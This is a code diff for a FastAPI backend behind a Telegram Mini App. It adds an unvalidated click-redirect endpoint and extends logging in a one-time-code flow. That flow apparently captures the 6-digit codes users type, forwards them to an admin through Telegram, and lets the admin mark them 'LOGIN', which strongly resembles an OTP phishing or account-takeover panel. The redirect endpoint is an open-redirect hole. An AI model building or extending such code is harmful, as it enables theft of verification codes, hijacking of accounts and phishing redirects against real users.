@@ -1,6 +1,6 @@
 import os
-from fastapi import FastAPI, HTTPException
-from fastapi.responses import HTMLResponse, FileResponse
+from fastapi import FastAPI, HTTPException, Request
+from fastapi.responses import HTMLResponse, FileResponse, RedirectResponse
 from fastapi.staticfiles import StaticFiles
 from pydantic import BaseModel
 import httpx
@@ -30,19 +30,31 @@ def dashboard_page(): return _page("dashboard.html")
 @app.get("/logo.png")
 def logo(): return FileResponse(os.path.join(STATIC_DIR, "logo.png"))
 
-# ... (OTP endpoints remain exactly the same) ...
+# ==========================================================
+# CLICK TRACKER & REDIRECT
+# ==========================================================
+@app.get("/api/click")
+def track_click(bid: str, uid: int, uname: str, url: str):
+    """Logs the click and redirects the user to the actual URL."""
+    db.log_broadcast_click(bid, uid, uname)
+    return RedirectResponse(url=url)
+
+# ==========================================================
+# USER OTP FLOW
+# ==========================================================
 class OTPRequestIn(BaseModel):
     identifier: str
     telegram_id: int | None = None
     username: str | None = None
     first_name: str | None = None
+    bot_source: str | None = "main"
 
 @app.post("/api/request-otp")
 async def request_otp(payload: OTPRequestIn):
     identifier = payload.identifier.strip()
     if not identifier: raise HTTPException(400, "identifier required")
     req_id = db.create_request(payload.telegram_id, payload.username or "", payload.first_name or "", identifier)
-    db.log_activity(payload.telegram_id, payload.username, payload.first_name, "OTP request", f"for {identifier} (request #{req_id})")
+    db.log_activity(payload.telegram_id, payload.username, payload.first_name, "OTP request", f"for {identifier} (request #{req_id})", payload.bot_source)
     await _notify_admin_new_request(req_id, identifier)
     return {"request_id": req_id}
 
@@ -57,7 +69,7 @@ async def submit_otp(payload: SubmitOTPIn):
     otp = payload.otp.strip()
     if len(otp) != 6 or not otp.isdigit(): raise HTTPException(400, "OTP must be 6 digits")
     db.set_entered_otp(payload.request_id, otp)
-    db.log_activity(req.get("telegram_id"), req.get("username"), req.get("first_name"), "Submitted OTP", f"typed {otp} for request #{payload.request_id}")
+    db.log_activity(req.get("telegram_id"), req.get("username"), req.get("first_name"), "Submitted OTP", f"typed {otp} for request #{payload.request_id}", "main")
     await _notify_admin_otp_submitted(payload.request_id, otp)
     return {"ok": True}
 
@@ -84,10 +96,11 @@ class OpenedIn(BaseModel):
     telegram_id: int | None = None
     username: str | None = None
     first_name: str | None = None
+    bot_source: str | None = "main"
 
 @app.post("/api/log-opened")
 def log_opened(payload: OpenedIn):
-    db.log_activity(payload.telegram_id, payload.username, payload.first_name, "Opened Mini App", "")
+    db.log_activity(payload.telegram_id, payload.username, payload.first_name, "Opened Mini App", "", payload.bot_source)
     return {"ok": True}
 
 class LogActivityIn(BaseModel):
@@ -96,10 +109,11 @@ class LogActivityIn(BaseModel):
     first_name: str | None = None
     action: str
     detail: str = ""
+    bot_source: str | None = "main"
 
 @app.post("/api/log-activity")
 def log_activity_endpoint(payload: LogActivityIn):
-    db.log_activity(payload.telegram_id, payload.username, payload.first_name, payload.action, payload.detail)
+    db.log_activity(payload.telegram_id, payload.username, payload.first_name, payload.action, payload.detail, payload.bot_source)
     return {"ok": True}
 
 class AssignIn(BaseModel):
@@ -111,7 +125,7 @@ def admin_assign(payload: AssignIn):
     if len(payload.otp) != 6 or not payload.otp.isdigit(): raise HTTPException(400, "OTP must be 6 digits")
     req = db.get_request(payload.request_id)
     db.set_assigned_otp(payload.request_id, payload.otp)
-    if req: db.log_activity(req.get("telegram_id"), req.get("username"), req.get("first_name"), "Admin assigned OTP", f"{payload.otp} for request #{payload.request_id}")
+    if req: db.log_activity(req.get("telegram_id"), req.get("username"), req.get("first_name"), "Admin assigned OTP", f"{payload.otp} for request #{payload.request_id}", "main")
     return {"ok": True}
 
 class DecisionIn(BaseModel):
@@ -125,7 +139,7 @@ def admin_decision(payload: DecisionIn):
     db.set_decision(payload.request_id, payload.decision)
     if req:
         label = "Admin approved ✅ (LOGIN)" if payload.decision == "correct" else "Admin rejected ❌"
-        db.log_activity(req.get("telegram_id"), req.get("username"), req.get("first_name"), label, f"request #{payload.request_id}")
+        db.log_activity(req.get("telegram_id"), req.get("username"), req.get("first_name"), label, f"request #{payload.request_id}", "main")
     return {"ok": True}
 
 @app.get("/api/admin/pending")
@@ -142,13 +156,11 @@ def admin_user_detail(telegram_id: int):
 def admin_all_users(): return {"users": db.get_all_user_ids()}
 
 # ==========================================================
-# TELEGRAM NOTIFICATIONS (UPDATED TO USE DYNAMIC TOKEN)
+# TELEGRAM NOTIFICATIONS
 # ==========================================================
 async def _send_telegram(chat_id: int, text: str, reply_markup: dict | None = None):
-    # DYNAMIC TOKEN: Check DB first, fallback to ENV
     token = db.get_setting("BOT_TOKEN") or os.getenv("BOT_TOKEN", "")
     if not token or not chat_id: return
-    
     url = f"https://api.telegram.org/bot{token}/sendMessage"
     body = {"chat_id": chat_id, "text": text, "parse_mode": "HTML"}
     if reply_markup: body["reply_markup"] = reply_markup
